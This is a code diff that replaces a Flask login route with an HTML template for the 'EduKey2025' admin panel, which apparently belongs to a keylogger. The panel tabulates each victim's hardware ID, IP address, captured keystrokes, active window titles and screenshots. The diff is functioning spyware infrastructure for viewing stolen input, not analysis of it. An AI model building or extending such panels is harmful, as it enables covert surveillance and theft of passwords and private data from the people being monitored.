@@ -1,70 +1,97 @@
-@app.route('/admin', methods=['GET', 'POST'])
-def admin():
-    if request.method == 'POST':
-        if request.form.get('password') == PASSWORD:
-            return render_template("admin.html", data=DATA)
-        else:
-            return "Zlé heslo", 403
-
-    # Pri GET zobraz hack style login form
-    return '''
-    <!DOCTYPE html>
-    <html lang="sk">
-    <head>
-        <meta charset="UTF-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1" />
-        <title>Prihlásenie - EduKey2025</title>
-        <style>
-            body {
-                background-color: #000;
-                color: #33ff33;
-                font-family: "Courier New", Courier, monospace;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                height: 100vh;
-                margin: 0;
-            }
-            form {
-                border: 1px solid #33ff33;
-                padding: 2rem;
-                box-shadow: 0 0 10px #33ff33;
-                width: 300px;
-            }
-            input[type="password"] {
-                background-color: #000;
-                color: #33ff33;
-                border: 1px solid #33ff33;
-                padding: 0.5rem;
-                width: 100%;
-                font-family: "Courier New", Courier, monospace;
-                margin-bottom: 1rem;
-            }
-            input[type="submit"] {
-                background-color: #33ff33;
-                color: #000;
-                border: none;
-                padding: 0.5rem;
-                width: 100%;
-                font-weight: bold;
-                cursor: pointer;
-                font-family: "Courier New", Courier, monospace;
-            }
-            input[type="submit"]:hover {
-                background-color: #00cc00;
-            }
-            label {
-                display: block;
-                margin-bottom: 0.5rem;
-            }
-        </style>
-    </head>
-    <body>
-        <form method="post">
-            <label for="password">Heslo:</label>
-            <input type="password" name="password" id="password" required autofocus />
-            <input type="submit" value="Prihlásiť sa" />
-        </form>
-    </body>
-    </html>
-    '''
+<!DOCTYPE html>
+<html lang="sk">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>EduKey2025 Admin Panel</title>
+<style>
+    body {
+        background-color: #000;
+        color: #33ff33;
+        font-family: "Courier New", Courier, monospace;
+        margin: 0;
+        padding: 1rem;
+    }
+    h1 {
+        text-align: center;
+        text-shadow: 0 0 5px #33ff33;
+    }
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 1rem;
+        font-size: 0.9rem;
+    }
+    th, td {
+        border: 1px solid #33ff33;
+        padding: 0.5rem;
+        text-align: left;
+        vertical-align: top;
+    }
+    th {
+        background-color: #003300;
+    }
+    tr:nth-child(even) {
+        background-color: #001a00;
+    }
+    a.logout {
+        display: block;
+        margin-bottom: 1rem;
+        color: #33ff33;
+        text-decoration: none;
+        font-weight: bold;
+        text-align: right;
+    }
+    a.logout:hover {
+        text-decoration: underline;
+    }
+    img.screenshot {
+        max-width: 200px;
+        max-height: 120px;
+        border: 1px solid #33ff33;
+        display: block;
+    }
+    td.keys {
+        white-space: pre-wrap;
+        max-width: 250px;
+        word-wrap: break-word;
+    }
+</style>
+</head>
+<body>
+    <a href="{{ url_for('logout') }}" class="logout">Odhlásiť sa</a>
+    <h1>EduKey2025 - Admin panel</h1>
+    <table>
+        <thead>
+            <tr>
+                <th>Timestamp</th>
+                <th>User ID</th>
+                <th>HWID</th>
+                <th>IP Address</th>
+                <th>Keys</th>
+                <th>Window</th>
+                <th>Screenshot</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for entry in data %}
+            <tr>
+                <td>{{ entry.timestamp }}</td>
+                <td>{{ entry.user_id or "N/A" }}</td>
+                <td>{{ entry.hwid or "N/A" }}</td>
+                <td>{{ entry.ip_address or "N/A" }}</td>
+                <td class="keys">{{ entry.keys or "N/A" }}</td>
+                <td>{{ entry.window or "N/A" }}</td>
+                <td>
+                    {% if entry.screenshot %}
+                        <img class="screenshot" src="data:image/png;base64,{{ entry.screenshot }}" alt="Screenshot" />
+                    {% else %}
+                        N/A
+                    {% endif %}
+                </td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+</body>
+</html>
